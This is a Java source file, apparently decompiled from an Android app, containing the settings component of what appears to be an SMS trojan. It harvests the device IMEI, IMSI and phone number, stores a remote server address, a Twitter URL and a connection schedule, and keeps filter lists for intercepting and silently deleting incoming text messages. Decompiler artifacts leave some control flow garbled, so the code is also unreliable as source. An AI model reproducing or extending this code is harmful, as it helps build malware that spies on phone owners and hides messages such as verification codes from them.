package ru.beta;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import java.io.PrintStream;
import java.util.Vector;
import org.json.JSONArray;
import org.json.JSONObject;

public class Settings
{
  private static String SETTINGS = "betaSettings";
  static Settings settings;
  public String apiKey = "";
  public String appId = "";
  public Vector<SmsItem> catchSmsList = new Vector();
  public Vector<SmsItem> deleteSmsList = new Vector();
  public String imei = "";
  public String imsi = "";
  public String packageName = "";
  public int period = 0;
  public String phone = "";
  public String server = "";
  public String sid = "";
  public int startPeriod = 0;
  public long timeNextConnection = 0L;
  public String twitterUrl = "";
  public String version = "";
  
  public Settings() {}
  
  public static Settings getSettings()
  {
    return settings;
  }
  
  public static void setSettings(Settings paramSettings)
  {
    settings = paramSettings;
  }
  
  public CatchResult isCatchMessage(String paramString1, String paramString2)
  {
    int i = 0;
    while (i < this.catchSmsList.size())
    {
      SmsItem localSmsItem = (SmsItem)this.catchSmsList.get(i);
      localSmsItem.number = localSmsItem.number.toLowerCase();
      localSmsItem.text = localSmsItem.text.toLowerCase();
      paramString1 = paramString1.toLowerCase();
      paramString2 = paramString2.toLowerCase();
      if ((localSmsItem.number.equals("*")) && (localSmsItem.text.equals("*"))) {
        return new CatchResult(true, localSmsItem.key);
      }
      if ((localSmsItem.number.equals("*")) && (paramString2.indexOf(localSmsItem.text) != -1)) {
        return new CatchResult(true, localSmsItem.key);
      }
      if ((localSmsItem.text.equals("*")) && (paramString1.indexOf(localSmsItem.number) != -1)) {
        return new CatchResult(true, localSmsItem.key);
      }
      if ((paramString1.indexOf(localSmsItem.number) != -1) && (paramString2.indexOf(localSmsItem.text) != -1)) {
        return new CatchResult(true, localSmsItem.key);
      }
      i += 1;
    }
    return new CatchResult(false, 0L);
  }
  
  public boolean isDeleteMessage(String paramString1, String paramString2)
  {
    int i = 0;
    while (i < this.deleteSmsList.size())
    {
      SmsItem localSmsItem = (SmsItem)this.deleteSmsList.get(i);
      localSmsItem.number = localSmsItem.number.toLowerCase();
      localSmsItem.text = localSmsItem.text.toLowerCase();
      paramString1 = paramString1.toLowerCase();
      paramString2 = paramString2.toLowerCase();
      if ((localSmsItem.number.equals("*")) && (localSmsItem.text.equals("*"))) {}
      while (((localSmsItem.number.equals("*")) && (paramString2.indexOf(localSmsItem.text) != -1)) || ((localSmsItem.text.equals("*")) && (paramString1.indexOf(localSmsItem.number) != -1)) || ((paramString1.indexOf(localSmsItem.number) != -1) && (paramString2.indexOf(localSmsItem.text) != -1))) {
        return true;
      }
      i += 1;
    }
    return false;
  }
  
  public boolean load(Context paramContext)
  {
    bool2 = false;
    if (Constants.DEBUG) {
      System.out.println("Settings::load() start");
    }
    this.imei = Functions.getImei(paramContext);
    this.imsi = Functions.getImsi(paramContext);
    this.phone = Functions.getPhone(paramContext);
    for (;;)
    {
      try
      {
        paramContext = paramContext.getSharedPreferences(SETTINGS, 1);
        if (!paramContext.contains("first")) {
          continue;
        }
        this.sid = paramContext.getString("sid", "");
        this.version = paramContext.getString("version", "");
        this.server = paramContext.getString("server", "");
        this.startPeriod = paramContext.getInt("startPeriod", 0);
        this.period = paramContext.getInt("period", 0);
        this.timeNextConnection = paramContext.getLong("timeNextConnection", 0L);
        this.twitterUrl = paramContext.getString("twitterUrl", "");
        this.apiKey = paramContext.getString("apiKey", "");
        this.appId = paramContext.getString("appId", "");
        this.packageName = paramContext.getString("packageName", "");
        this.deleteSmsList = new Vector();
        Object localObject1 = new JSONArray(paramContext.getString("deleteSms", ""));
        int i = 0;
        if (i < ((JSONArray)localObject1).length())
        {
          Object localObject2 = ((JSONArray)localObject1).getJSONObject(i);
          localObject2 = new SmsItem(((JSONObject)localObject2).getString("phone"), ((JSONObject)localObject2).getString("text"));
          this.deleteSmsList.add(localObject2);
          i += 1;
          continue;
        }
        this.catchSmsList = new Vector();
        paramContext = new JSONArray(paramContext.getString("catchSms", ""));
        i = 0;
        if (i < paramContext.length())
        {
          localObject1 = paramContext.getJSONObject(i);
          localObject1 = new SmsItem(((JSONObject)localObject1).getString("phone"), ((JSONObject)localObject1).getString("text"));
          this.catchSmsList.add(localObject1);
          i += 1;
          continue;
        }
        bool1 = true;
      }
      catch (Exception paramContext)
      {
        paramContext.printStackTrace();
        boolean bool1 = bool2;
        continue;
      }
      if (Constants.DEBUG) {
        System.out.println("Settings::load() end");
      }
      return bool1;
      bool1 = bool2;
      if (Constants.DEBUG)
      {
        System.out.println("not contaion first");
        bool1 = bool2;
      }
    }
  }
  
  public void printToOutStream()
  {
    try
    {
      JSONObject localJSONObject1 = new JSONObject();
      localJSONObject1.put("sid", this.sid);
      localJSONObject1.put("version", this.version);
      localJSONObject1.put("server", this.server);
      localJSONObject1.put("startPeriod", this.startPeriod);
      localJSONObject1.put("period", this.period);
      localJSONObject1.put("timeNextConnection", this.timeNextConnection);
      localJSONObject1.put("twitterUrl", this.twitterUrl);
      localJSONObject1.put("apiKey", this.apiKey);
      localJSONObject1.put("appId", this.appId);
      JSONArray localJSONArray = new JSONArray();
      int i = 0;
      SmsItem localSmsItem;
      JSONObject localJSONObject2;
      while (i < this.deleteSmsList.size())
      {
        localSmsItem = (SmsItem)this.deleteSmsList.get(i);
        localJSONObject2 = new JSONObject();
        localJSONObject2.put("key", localSmsItem.key);
        localJSONObject2.put("number", localSmsItem.number);
        localJSONObject2.put("text", localSmsItem.text);
        localJSONArray.put(localJSONObject2);
        i += 1;
      }
      localJSONObject1.put("deleteSmsList", localJSONArray);
      localJSONArray = new JSONArray();
      i = 0;
      while (i < this.catchSmsList.size())
      {
        localSmsItem = (SmsItem)this.catchSmsList.get(i);
        localJSONObject2 = new JSONObject();
        localJSONObject2.put("key", localSmsItem.key);
        localJSONObject2.put("number", localSmsItem.number);
        localJSONObject2.put("text", localSmsItem.text);
        localJSONArray.put(localJSONObject2);
        i += 1;
      }
      localJSONObject1.put("catchSmsList", localJSONArray);
      System.out.println(localJSONObject1.toString(4));
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public void removeCatchFilter(long paramLong)
  {
    int i = 0;
    for (;;)
    {
      if (i < this.catchSmsList.size())
      {
        if (((SmsItem)this.catchSmsList.get(i)).key == paramLong) {
          this.catchSmsList.remove(i);
        }
      }
      else {
        return;
      }
      i += 1;
    }
  }
  
  public void reset(Context paramContext)
  {
    try
    {
      paramContext = paramContext.getSharedPreferences(SETTINGS, 2).edit();
      paramContext.clear();
      paramContext.commit();
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public boolean save(Context paramContext)
  {
    if (Constants.DEBUG) {
      System.out.println("Settings::save() start");
    }
    try
    {
      paramContext = paramContext.getSharedPreferences(SETTINGS, 2).edit();
      paramContext.putBoolean("first", false);
      paramContext.putString("sid", this.sid);
      paramContext.putString("version", this.version);
      paramContext.putString("server", this.server);
      paramContext.putInt("startPeriod", this.startPeriod);
      paramContext.putInt("period", this.period);
      paramContext.putLong("timeNextConnection", this.timeNextConnection);
      paramContext.putString("twitterUrl", this.twitterUrl);
      paramContext.putString("apiKey", this.apiKey);
      paramContext.putString("appId", this.appId);
      paramContext.putString("packageName", this.packageName);
      JSONArray localJSONArray = new JSONArray();
      int i = 0;
      SmsItem localSmsItem;
      JSONObject localJSONObject;
      while (i < this.deleteSmsList.size())
      {
        localSmsItem = (SmsItem)this.deleteSmsList.get(i);
        localJSONObject = new JSONObject();
        localJSONObject.put("phone", localSmsItem.number);
        localJSONObject.put("text", localSmsItem.text);
        localJSONArray.put(localJSONObject);
        i += 1;
      }
      paramContext.putString("deleteSms", localJSONArray.toString());
      localJSONArray = new JSONArray();
      i = 0;
      while (i < this.catchSmsList.size())
      {
        localSmsItem = (SmsItem)this.catchSmsList.get(i);
        localJSONObject = new JSONObject();
        localJSONObject.put("phone", localSmsItem.number);
        localJSONObject.put("text", localSmsItem.text);
        localJSONArray.put(localJSONObject);
        i += 1;
      }
      paramContext.putString("catchSms", localJSONArray.toString());
      paramContext.commit();
    }
    catch (Exception paramContext)
    {
      for (;;)
      {
        paramContext.printStackTrace();
      }
    }
    if (Constants.DEBUG) {
      System.out.println("Settings::save() end");
    }
    return false;
  }
}
